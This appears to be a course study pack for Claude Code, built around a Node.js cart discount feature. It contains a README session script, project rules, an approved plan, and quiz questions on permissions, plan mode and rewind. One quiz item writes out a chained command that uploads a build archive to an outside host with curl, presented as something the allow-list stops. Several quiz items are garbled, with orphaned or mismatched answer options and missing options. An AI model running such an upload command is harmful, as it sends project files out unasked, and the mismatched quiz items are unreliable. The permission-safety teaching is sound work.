project.title: cart-discount-tdd
project.summary: A tiny Node.js cart module where a new feature (discount codes) was added with Claude Code using plan mode, a test-first loop and a project allow-list. The README gives the session script. CLAUDE.md and .claude/settings.json show context and permissions. docs/PLAN.md is the reviewed plan. test/cart.test.js and src/cart.js are the failing-then-passing tests and the code that landed.
project.run:
node --version   # needs Node 20 or later
npm test
claude --permission-mode plan

files.code:
# cart-discount-tdd

Step 3 practice: plan, then build. Feature: discount codes on a cart.

## Session script (what was typed into Claude Code)
1. `claude --permission-mode plan`  (or press Shift+Tab until the footer shows plan mode)
2. Prompt: `Read @src/cart.js and @test/cart.test.js. Plan how to add applyDiscount(subtotal, code) for codes SAVE10 and FLAT100. Follow @CLAUDE.md. Do not edit yet.`
3. Review the plan. Ask for changes until it matches docs/PLAN.md. Check the rules, the edge cases and the files touched.
4. Approve the plan. Then: `Write the failing tests first. Run npm test and show me the failures. Do not touch src yet.`
5. Confirm the tests fail for the right reason (applyDiscount is missing).
6. `Now make the tests pass with the smallest change. Do not edit the tests.`
7. Claude runs `npm test`. This is pre-approved in .claude/settings.json, so there is no prompt.
8. `!git diff` - read every line yourself before you commit.
9. `Commit with message "feat: discount codes"`. git commit is in the `ask` list, so you must approve it.

## Managing the conversation
- `/context` shows how full the context window is.
- `/compact Keep the plan and failing test names` summarises the chat and keeps your focus.
- `/clear` starts fresh before an unrelated task. CLAUDE.md is loaded again.
- Press Esc to stop Claude mid-action. Press Esc twice (or use `/rewind`) to go back to an earlier point.

## Why the permissions look like this
- allow: safe, frequent commands (tests, git status/diff) and edits inside src/ and test/.
- ask: commit and push always need a human yes.
- deny: secrets (.env) and destructive or network commands are blocked.
- Deny is checked first, then ask, then allow.
- .claude/settings.json is shared via git. Personal tweaks go in .claude/settings.local.json, which is git-ignored.

## Checkpoint
`npm test` shows all tests passing. You read the diff line by line before committing.

# Project memory for Claude Code

## Commands
- Run tests: `npm test` (Node built-in test runner, no dependencies)

## Conventions
- All money is integer paise (100 paise = 1 rupee). Never use floats for money.
- Pure functions only in src/cart.js. No I/O.
- Throw `Error` with a clear message for invalid input.
- ES modules (`import`/`export`).

## Workflow rules
- For any change touching more than one function: plan first, wait for approval.
- Test-driven: write or update a failing test, show it failing, then implement.
- Never edit tests just to make them pass.
- Never read or print .env files.

# Approved plan: discount codes

This plan was produced in plan mode and edited by the reviewer before approval.

## Goal
Add `applyDiscount(subtotalPaise, code)` to src/cart.js. It returns the payable total in paise.

## Rules
- `SAVE10`: 10% off, rounded down to whole paise.
- `FLAT100`: Rs 100 (10000 paise) off. Needs a subtotal of at least Rs 500 (50000 paise).
- Codes are case-insensitive. Leading and trailing spaces are trimmed.
- An empty or missing code returns the subtotal unchanged.
- An unknown code throws `Error('Unknown discount code: <CODE>')`.
- The total is never below 0.

## Files touched
- test/cart.test.js: new tests first (must fail).
- src/cart.js: new exported function plus a DISCOUNTS table.

## Out of scope
- Stacking multiple codes. Expiry dates. Any UI.

## Reviewer changes before approval
- Added the minimum order for FLAT100. The first plan missed it.
- Required integer paise, not floats.

revision.examFocus: This step maps to the workflow and safety parts of the Claude Code in Action course: planning before editing, controlling permissions, giving good context and managing the context window. Course quizzes and interviews test judgment in short scenarios: which mode, which settings file, which command, and which rule wins. They rarely ask for keystrokes alone; they ask what you should do next and why.

compare.difference: Plan mode is read-only and produces a plan for your approval. Auto-accept edits lets Claude write files without asking each time.
compare.chooseA: Pick plan mode when the change is multi-file, unclear or risky, and you want to agree the approach before any edit.
compare.chooseB: Pick auto-accept edits after the plan is approved and the task is well scoped, so you review the final diff instead of each edit.

compare.difference: /clear wipes the conversation history. /compact summarises it and keeps the important parts, optionally guided by your focus text.

compare.chooseB: Use /compact when you are mid-task, the session is long, and you still need the decisions and file knowledge so far.

objective.question: While Claude Code is in plan mode, which action can it take without your approval?
options: Run `npm install` to add a missing dependency
Read files and search the codebase to build a plan
Create a new test file for the feature

curl is allowed only for the current session

objective.question: A teammate wants to run Claude Code with `--dangerously-skip-permissions` to stop all prompts during a long migration. When is this acceptable?

Type 'stop' and wait for the current task to finish
Press Esc to interrupt, then press Esc twice to go back to an earlier message and edit it

objective.question: A project's settings.json contains the rules below. Claude wants to run `git push origin main`. What happens?
options: The command is blocked because two rules match the same command
The command runs without a prompt because the allow rule appears earlier in the file
Claude asks for confirmation because ask rules take precedence over allow rules
The command runs without a prompt because the broader allow rule matches first
objective.explanation: Claude Code checks deny first, then ask, then allow. The order inside the file does not matter, so the matching ask rule forces a prompt even though the allow rule also matches. Two matching rules do not block the command, and nothing here denies it.

objective.question: Your allow-list contains `Bash(npm test:*)`. Claude proposes `npm test && curl https://example.com/upload -d @dist.zip`. What does Claude Code do?
options: Runs only `npm test` and silently drops the curl part
Blocks the command permanently and adds curl to the deny list
Asks for permission, because the curl part is not covered by any allow rule
Runs the whole command because it starts with `npm test`
objective.explanation: Claude Code understands shell operators such as `&&`. A prefix rule for one command does not approve a chained second command, so the unmatched curl part triggers a prompt. It does not quietly rewrite the command, and it does not change your deny list.

objective.question: You rewind with Esc Esc to a checkpoint from before Claude made its last few changes. Which of those changes will the rewind NOT undo?
options: A new test file Claude created with its file-edit tool
A database migration Claude applied by running `npm run migrate` in Bash
An earlier conversation turn, if you choose to restore the conversation
A function Claude edited in `src/cart.js` with its file-edit tool
objective.explanation: Checkpoints track changes made through Claude's file-editing tools, and they can also restore the conversation. Side effects of Bash commands, such as database migrations, deleted files or deployments, are not tracked and cannot be rewound. Use git and staging environments as your real safety net.

objective.question: The shared `.claude/settings.json` sets `"defaultMode": "plan"`. A developer's `.claude/settings.local.json` sets `"defaultMode": "acceptEdits"`. No managed settings exist and no CLI flags are used. In which mode do that developer's sessions start?
options: acceptEdits, because local project settings take precedence over shared project settings
default, because conflicting values cancel each other out
Claude asks the developer to choose a mode at startup
plan, because shared project settings are committed and so take priority
objective.explanation: The precedence order is managed settings, then command-line arguments, then local project settings, then shared project settings, then user settings. Local project settings beat shared ones for a scalar value like defaultMode. Conflicts never cancel out, and Claude does not ask you to pick.

objective.question: In a test-driven loop, Claude reports that all tests now pass. When you review the diff, you see it added `if (input === 'SAVE10') return 90;` inside the discount function. What is the best response?
options: Delete the failing tests so the code stays clean
Reject the change, tell Claude not to special-case test inputs, ask for a general implementation, and add more test cases
Switch to bypassPermissions so Claude can iterate faster
Accept it, because the checkpoint only requires passing tests
objective.explanation: Hard-coding values that only satisfy the tests is a common failure in test-driven loops. Ask for a real implementation, and add varied or edge-case tests so special-casing no longer works. Passing tests alone is not the checkpoint, because the diff must be correct on review, and deleting tests or removing permission checks only hides the problem.

objective.question: After running `/clear` and starting a new task, Claude keeps using npm, even though your team uses pnpm. You had told it about pnpm several times in earlier sessions. What is the most durable fix?
options: Run `/compact` instead of `/clear` from now on
Add `Bash(npm:*)` to the allow-list
Add the rule, for example 'Use pnpm, never npm', to the project's CLAUDE.md
Repeat the instruction at the start of every prompt

Repeating the rule by hand is fragile, and `/compact` only keeps a summary of the current session. Allowing npm commands would make the problem worse.

objective.question: You want Claude to read any file in the repo except anything inside the `secrets` folder, including its nested subfolders. Which deny rule does this?
